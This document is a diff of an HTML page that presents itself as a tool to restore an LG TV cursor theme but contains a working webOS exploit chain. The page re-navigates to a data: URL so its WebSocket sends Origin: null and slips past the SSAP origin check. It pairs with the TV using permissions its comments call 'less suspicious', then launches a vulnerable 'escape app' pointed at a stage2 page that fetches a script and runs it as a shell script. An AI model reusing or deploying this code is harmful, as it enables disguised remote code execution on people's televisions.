@@ -1,1 +1,223 @@
-<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>Return Beanbird Cursor</title> <style> /* ── Moonstone/Enyo-inspired design tokens ── */ @font-face { font-family: "MuseoSans 300"; src: local("LG Display-Light"); font-weight: 400; } @font-face { font-family: "MuseoSans 700"; src: local("LG Display-Regular"); font-weight: 400; } @font-face { font-family: "Moonstone Miso"; src: local("LG Display-Light"); font-weight: 400; } *, *::before, *::after { box-sizing: border-box; } body { margin: 0; background: #000; color: #a6a6a6; font-family: "MuseoSans 300", "Helvetica Neue", Arial, sans-serif; font-size: 1.375rem; height: 100vh; display: flex; flex-direction: column; } /* ── Header (moon.Header small) ── */ .moon-header { border-top: .125rem solid #505050; border-bottom: .25rem solid #404040; padding: .75rem .75rem .5rem; display: flex; align-items: center; gap: 1.5rem; flex-shrink: 0; } .moon-header-title { font-family: "Moonstone Miso", "MuseoSans 700", sans-serif; font-size: 2.5rem; color: #ccc; line-height: 1.3em; margin: 0; } .moon-header-subtitle { font-family: "MuseoSans 300", sans-serif; font-size: 1.125rem; color: #a6a6a6; margin: .125rem 0 0; } /* ── Panel body ── */ .panel-body { flex: 1; display: flex; flex-direction: column; padding: 1.5rem 2rem; overflow: hidden; } /* ── Instruction text ── */ .moon-body-text { font-family: "MuseoSans 300", sans-serif; font-size: 1.375rem; color: #a6a6a6; line-height: 1.625rem; margin: 0 0 1.5rem; } /* ── Divider ── */ .moon-divider { border-bottom: .125rem solid #595959; margin: 0 0 1.25rem; padding-bottom: .125rem; font-family: "MuseoSans 700", sans-serif; font-style: italic; font-size: 1rem; color: #a6a6a6; text-transform: uppercase; letter-spacing: .05em; } /* ── Buttons (moon.Button) ── */ .btn-row { display: flex; gap: 1rem; flex-wrap: wrap; margin-bottom: 2rem; } .moon-button { display: inline-block; height: 3.5rem; line-height: 3rem; border-radius: 416rem; background: #4d4d4d; border: .25rem solid transparent; padding: 0 1.5rem; font-family: "Moonstone Miso", "MuseoSans 700", sans-serif; font-size: 1.5rem; color: #ccc; cursor: pointer; text-transform: uppercase; letter-spacing: .04em; min-width: 7.5rem; text-align: center; transition: background .15s, border-color .15s, transform .1s; white-space: nowrap; vertical-align: top; user-select: none; -webkit-user-select: none; outline: none; } .moon-button:focus, .moon-button.spotlight { background: #cf0652; color: #fff; border-color: transparent; } .moon-button:active { transform: scale(.96); background: #4d4d4d; border-color: #cf0652; } .moon-button.secondary { background: #333; color: #888; font-size: 1.125rem; height: 2.5rem; line-height: 2rem; padding: 0 1rem; min-width: 5rem; } .moon-button.secondary:focus, .moon-button.secondary.spotlight { background: #cf0652; color: #fff; } .moon-button[disabled] { opacity: .4; cursor: default; pointer-events: none; } /* ── Log box ── */ .log-label { font-family: "MuseoSans 700", sans-serif; font-size: 1rem; color: #a6a6a6; text-transform: uppercase; letter-spacing: .05em; margin-bottom: .375rem; } .log-box { flex: 1; background: #111; border: .125rem solid #333; border-radius: .25rem; padding: .75rem 1rem; font-family: "Lucida Console", "Courier New", monospace; font-size: 1rem; color: #00e676; line-height: 1.6em; overflow-y: auto; white-space: pre-wrap; word-break: break-all; } .log-box .log-ok { color: #69cdff; } .log-box .log-warn { color: #ffb80d; } .log-box .log-err { color: #ff4a4a; } /* ── Note banner ── */ .moon-note { border: .125rem solid #ffb80d; color: #ffb80d; border-radius: .375rem; padding: .5rem 1rem; font-size: 1rem; margin-bottom: 1.25rem; display: inline-block; } </style> </head> <body> <!-- Header --> <header class="moon-header"> <div> <h1 class="moon-header-title">Return Beanbird Cursor</h1> <p class="moon-header-subtitle">Restore the original LG cursor theme</p> </div> </header> <!-- Panel body --> <div class="panel-body"> <p class="moon-body-text"> Press <strong style="color:#ccc">Return Beanbird Cursor</strong> and accept the pairing prompt on your TV screen. The display will go black for 10–20 seconds while the cursor is applied. </p> <div class="moon-note">Requires Homebrew Channel with root service active.</div> <div class="moon-divider">Actions</div> <div class="btn-row"> <button id="btn-run" class="moon-button" tabindex="0">Return Beanbird Cursor</button> <button id="btn-reset" class="moon-button secondary" tabindex="0">Reset to Default</button> </div> <div class="log-label">Status</div> <div id="log" class="log-box">Ready.</div> </div> <script> // ── Capture full base URL (including /rbc/ path) before data: navigation ── window.ORIGIN_URL = window.location.protocol === 'data:' ? '__ORIGIN__' : window.location.protocol === 'file:' ? 'http://127.0.0.1' : window.location.href.replace(/\/[^\/]*$/, ''); // ── Navigate to data: URL so WebSocket sends Origin: null ── // SSAP on webOS 4.x blocks http/https origins but allows null (data: origin). try { if (window.location.protocol !== 'data:') { var html = document.documentElement.innerHTML .replace('__ORIGIN__', window.ORIGIN_URL); var b64 = btoa(unescape(encodeURIComponent(html))); window.location = 'data:text/html;base64,' + b64; } } catch(e) {} </script> <script> // ── Log helper ── var logEl = document.getElementById('log'); function log(str, cls) { var line = document.createElement('span'); if (cls) line.className = 'log-' + cls; line.textContent = '> ' + str + '\n'; logEl.appendChild(line); logEl.scrollTop = logEl.scrollHeight; } // ── ProxyWebSocket ── // Opens the WebSocket inside a data: iframe so Origin: null is sent. // Direct new WebSocket() from http: sends Origin: http://... which SSAP 4.x rejects. function ProxyWebSocket(target) { function proxyPayload(address) { function forward(type, data) { window.parent.postMessage(JSON.stringify({ type: type, data: data }), '*'); } try { var conn = new WebSocket(address); conn.onopen = function(e) { forward('open', e); }; conn.onclose = function(e) { forward('close', e); }; conn.onerror = function(e) { forward('error', e); }; conn.onmessage = function(e) { forward('message', { data: e.data }); }; window.addEventListener('message', function(ev) { var msg = JSON.parse(ev.data); if (msg.type === 'send') conn.send(msg.data); }, false); } catch(err) { forward('error', err); } } var self = this; this.proxy = document.createElement('iframe'); this.proxy.style.display = 'none'; this.proxy.setAttribute('src', 'data:text/html;base64,' + btoa( '<script>' + proxyPayload.toString() + ';proxyPayload(' + JSON.stringify(target) + ');<\/script>' ) ); window.addEventListener('message', function(ev) { if (ev.source !== self.proxy.contentWindow) return; var msg = JSON.parse(ev.data); if (msg.type === 'message' && self.onmessage) self.onmessage(msg.data); if (msg.type === 'open' && self.onopen) self.onopen(msg.data); if (msg.type === 'close' && self.onclose) self.onclose(msg.data); if (msg.type === 'error' && self.onerror) self.onerror(msg.data); }, false); document.body.appendChild(this.proxy); } ProxyWebSocket.prototype.send = function(data) { this.proxy.contentWindow.postMessage(JSON.stringify({ type: 'send', data: data }), '*'); }; ProxyWebSocket.prototype.close = function() { if (this.proxy.parentNode) this.proxy.parentNode.removeChild(this.proxy); }; // ── Main exploit ── var activeConn = null; function startExploit(scriptName) { if (activeConn) { try { activeConn.close(); } catch(e) {} } var stage2Url = window.ORIGIN_URL + '/stage2.html#' + encodeURIComponent(scriptName); log('Connecting via proxy iframe (Origin: null)…'); var conn = new ProxyWebSocket('ws://127.0.0.1:3000'); activeConn = conn; conn.onerror = function() { log('ERROR: Could not connect. Enable LG Connect Apps on the TV.', 'err'); }; conn.onclose = function() { log('Connection closed.'); }; conn.onopen = function() { log('Connected. >>> ACCEPT THE PROMPT ON YOUR TV <<<', 'ok'); conn.send(JSON.stringify({ id: 'reg_0', type: 'register', payload: { forcePairing: false, pairingType: 'PROMPT', manifest: { manifestVersion: 1, localizedAppNames: { '': 'Beanbird Cursor' }, permissions: ['LAUNCH', 'READ_INSTALLED_APPS'] } } })); }; var pending = {}; function request(uri, payload, cb) { var id = 'req_' + Date.now(); pending[id] = cb; conn.send(JSON.stringify({ id: id, type: 'request', uri: uri, payload: payload })); } conn.onmessage = function(evt) { var msg; try { msg = JSON.parse(evt.data); } catch(e) { log('Parse error: ' + evt.data, 'err'); return; } if (msg.type === 'registered') { log('Registered! Scanning for escape app…', 'ok'); request('ssap://com.webos.applicationManager/listApps', {}, function(res) { var candidates = { 'com.webos.app.facebooklogin': { priority: 1000, params: function(u) { return { server: u.replace(/^https?:\/\//, '') + '#' }; } }, 'com.webos.app.alibaba': { priority: 800, params: function(u) { return { target: u }; } }, 'com.webos.app.acrcard': { priority: 600, params: function(u) { return { contentTarget: u }; } } }; var best = null; (res.payload.apps || []).forEach(function(app) { if (app.id in candidates) { log('Found escape app: ' + app.id); if (!best || candidates[app.id].priority > candidates[best].priority) best = app.id; } }); if (!best) { log('ERROR: No escape app found. TV may be patched.', 'err'); return; } log('Launching ' + best + '…', 'ok'); request('ssap://system.launcher/launch', { id: best, params: candidates[best].params(stage2Url) }, function(res2) { log('Launch result: ' + JSON.stringify(res2.payload)); }); }); } else if (msg.type === 'response') { if (pending[msg.id]) { pending[msg.id](msg); delete pending[msg.id]; } } else if (msg.type === 'error') { log('Error (prompt declined?): ' + evt.data, 'err'); if (pending[msg.id]) { pending[msg.id](msg); delete pending[msg.id]; } } }; } // Use .txt extension — HTTP servers serve these without MIME issues. // Stage2 saves them locally as .sh before running. document.getElementById('btn-run').onclick = function() { startExploit('beanbird.txt'); }; document.getElementById('btn-reset').onclick = function() { startExploit('reboot.txt'); }; // Keyboard nav — TV remote D-pad focuses buttons document.addEventListener('keydown', function(e) { var focused = document.activeElement; if (!focused || !focused.classList.contains('moon-button')) { if (e.keyCode === 13 || e.keyCode === 32) document.getElementById('btn-run').focus(); } }); </script> </body> </html>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Return the Beanbird Cursor</title>
+    <style>
+        body { background: #1a1a1a; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .button { padding: 20px 40px; margin: 10px; font-size: 1.2rem; border-radius: 50px; border: none; cursor: pointer; color: white; font-weight: bold; transition: 0.2s; }
+        #btn-run { background: #ff0066; border: 2px solid #ff9900; }
+        #btn-reset { background: #444; color: #ccc; }
+        .button:focus { outline: 4px solid #fff; transform: scale(1.05); }
+        #log { background: #000; color: #00ff00; width: 80%; height: 150px; margin: 20px auto; padding: 10px; text-align: left; font-family: monospace; border: 1px solid #333; overflow-y: auto; }
+        .note { border: 1px solid #ffcc00; color: #ffcc00; padding: 10px; display: inline-block; margin: 10px; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <h1>Return the Beanbird Cursor</h1>
+    <p>Press the button below and <b>Accept the prompt on your TV screen.</b></p>
+    
+    <button id="btn-run" class="button">Return Beanbird Cursor</button>
+    <button id="btn-reset" class="button">Reset to Default</button>
+    <br>
+    <div class="note">Note: TV will be blackscreen for 10-20 seconds during the process.</div>
+    
+    <div id="log">Status: Ready.</div>
+
+    <script>
+        // --- Capture the full base URL (including subdirectory path) before data: navigation ---
+        // window.location.origin alone gives https://itsrealm12c.github.io — missing /rbc/.
+        // We need the full folder path so stage2.html and script URLs resolve correctly.
+        window.ORIGIN_URL =
+            window.location.protocol === 'data:' ? '__ORIGIN__' :
+            window.location.protocol === 'file:' ? 'http://127.0.0.1' :
+            window.location.href.replace(/\/[^\/]*$/, ''); // strips filename, keeps folder path
+
+        // --- Navigate self to data: URL so WebSocket sends Origin: null ---
+        // SSAP on webOS 4.x blocks http/https origins but allows null (data: origin).
+        // btoa() crashes on non-Latin1 chars on older webOS Chromium — use the
+        // unescape+encodeURIComponent trick to safely encode any unicode in the page HTML.
+        try {
+            if (window.location.protocol !== 'data:') {
+                var html = document.documentElement.innerHTML
+                    .replace('__ORIGIN__', window.ORIGIN_URL);
+                // Safe btoa for unicode: percent-encode then collapse back to bytes
+                var b64 = btoa(unescape(encodeURIComponent(html)));
+                window.location = 'data:text/html;base64,' + b64;
+                // Execution stops here — page reloads as data: URL
+            }
+        } catch(e) {}
+    </script>
+    <script>
+        var logBox = document.querySelector('#log');
+        function log(str) { logBox.innerText += '> ' + str + '\n'; logBox.scrollTop = logBox.scrollHeight; }
+
+        // --- ProxyWebSocket ---
+        // Opens the real WebSocket inside a data: iframe so Origin: null is sent.
+        // Direct new WebSocket() from an http: page sends Origin: http://... which
+        // SSAP on webOS 4.x rejects silently — that was the core bug.
+        function ProxyWebSocket(target) {
+            function proxyPayload(address) {
+                function forward(type, data) {
+                    window.parent.postMessage(JSON.stringify({ type: type, data: data }), '*');
+                }
+                try {
+                    var conn = new WebSocket(address);
+                    conn.onopen    = function(e) { forward('open', e); };
+                    conn.onclose   = function(e) { forward('close', e); };
+                    conn.onerror   = function(e) { forward('error', e); };
+                    conn.onmessage = function(e) { forward('message', { data: e.data }); };
+                    window.addEventListener('message', function(ev) {
+                        var msg = JSON.parse(ev.data);
+                        if (msg.type === 'send') conn.send(msg.data);
+                    }, false);
+                } catch(err) { forward('error', err); }
+            }
+
+            var self = this;
+            this.proxy = document.createElement('iframe');
+            this.proxy.style.display = 'none';
+            this.proxy.setAttribute('src',
+                'data:text/html;base64,' + btoa(
+                    '<script>' + proxyPayload.toString() +
+                    ';proxyPayload(' + JSON.stringify(target) + ');<\/script>'
+                )
+            );
+            window.addEventListener('message', function(ev) {
+                if (ev.source !== self.proxy.contentWindow) return;
+                var msg = JSON.parse(ev.data);
+                if (msg.type === 'message' && self.onmessage) self.onmessage(msg.data);
+                if (msg.type === 'open'    && self.onopen)    self.onopen(msg.data);
+                if (msg.type === 'close'   && self.onclose)   self.onclose(msg.data);
+                if (msg.type === 'error'   && self.onerror)   self.onerror(msg.data);
+            }, false);
+            document.body.appendChild(this.proxy);
+        }
+        ProxyWebSocket.prototype.send = function(data) {
+            this.proxy.contentWindow.postMessage(JSON.stringify({ type: 'send', data: data }), '*');
+        };
+        ProxyWebSocket.prototype.close = function() {
+            if (this.proxy.parentNode) this.proxy.parentNode.removeChild(this.proxy);
+        };
+
+        // --- Main exploit ---
+        var activeConn = null;
+
+        function startExploit(scriptName) {
+            if (activeConn) { try { activeConn.close(); } catch(e) {} }
+
+            // Build stage2 URL using the captured HTTP origin (ORIGIN_URL),
+            // because window.location is now data: and has no useful origin.
+            // Pass script name as hash fragment, NOT ?run= query param.
+            // facebooklogin rewrites/drops query strings when loading the server URL,
+            // but # fragment is never sent to the server so it survives intact.
+            var stage2Url = window.ORIGIN_URL + '/stage2.html#' + encodeURIComponent(scriptName);
+
+            log('Connecting via proxy iframe (Origin: null)...');
+            var conn = new ProxyWebSocket('ws://127.0.0.1:3000');
+            activeConn = conn;
+
+            conn.onerror = function() {
+                log('ERROR: Could not connect. Check LG Connect Apps is enabled on the TV.');
+            };
+            conn.onclose = function() { log('Connection closed.'); };
+
+            conn.onopen = function() {
+                log('Connected. >>> ACCEPT THE PROMPT ON YOUR TV <<<');
+                conn.send(JSON.stringify({
+                    id: 'reg_0',
+                    type: 'register',
+                    payload: {
+                        forcePairing: false,
+                        pairingType: 'PROMPT',
+                        manifest: {
+                            manifestVersion: 1,
+                            localizedAppNames: { '': 'Beanbird Cursor' },
+                            // Minimal set — less suspicious, still enough to listApps + launch
+                            permissions: ['LAUNCH', 'READ_INSTALLED_APPS']
+                        }
+                    }
+                }));
+            };
+
+            // Pending request callbacks keyed by message id
+            var pending = {};
+            function request(uri, payload, cb) {
+                var id = 'req_' + Date.now();
+                pending[id] = cb;
+                conn.send(JSON.stringify({ id: id, type: 'request', uri: uri, payload: payload }));
+            }
+
+            conn.onmessage = function(evt) {
+                var msg;
+                try { msg = JSON.parse(evt.data); } catch(e) { log('Parse error: ' + evt.data); return; }
+
+                if (msg.type === 'registered') {
+                    log('Registered! Scanning for escape app...');
+
+                    // Query installed apps and pick best available escape hatch —
+                    // same priority logic as RootMyTV so we work even if facebooklogin is absent.
+                    request('ssap://com.webos.applicationManager/listApps', {}, function(res) {
+                        var candidates = {
+                            'com.webos.app.facebooklogin': {
+                                priority: 1000,
+                                params: function(u) { return { server: u.replace(/^https?:\/\//, '') + '#' }; }
+                            },
+                            'com.webos.app.alibaba': {
+                                priority: 800,
+                                params: function(u) { return { target: u }; }
+                            },
+                            'com.webos.app.acrcard': {
+                                priority: 600,
+                                params: function(u) { return { contentTarget: u }; }
+                            }
+                        };
+
+                        var best = null;
+                        (res.payload.apps || []).forEach(function(app) {
+                            if (app.id in candidates) {
+                                log('Found escape app: ' + app.id);
+                                if (!best || candidates[app.id].priority > candidates[best].priority) {
+                                    best = app.id;
+                                }
+                            }
+                        });
+
+                        if (!best) {
+                            log('ERROR: No escape app found (facebooklogin/alibaba/acrcard). TV may be patched.');
+                            return;
+                        }
+
+                        log('Launching ' + best + ' -> ' + stage2Url);
+                        request('ssap://system.launcher/launch', {
+                            id: best,
+                            params: candidates[best].params(stage2Url)
+                        }, function(res2) {
+                            log('Launch result: ' + JSON.stringify(res2.payload));
+                        });
+                    });
+
+                } else if (msg.type === 'response') {
+                    if (pending[msg.id]) {
+                        pending[msg.id](msg);
+                        delete pending[msg.id];
+                    }
+                    // else: intermediate register response — just wait
+
+                } else if (msg.type === 'error') {
+                    log('Error (prompt declined?): ' + evt.data);
+                    if (pending[msg.id]) {
+                        pending[msg.id](msg);
+                        delete pending[msg.id];
+                    }
+                }
+            };
+        }
+
+        // Use .txt extension so any HTTP server serves the file without MIME blocking.
+        // Stage2 saves it locally as .sh before executing.
+        document.querySelector('#btn-run').onclick    = function() { startExploit('beanbird.txt'); };
+        document.querySelector('#btn-reset').onclick  = function() { startExploit('reboot.txt'); };
+    </script>
+</body>
+</html>
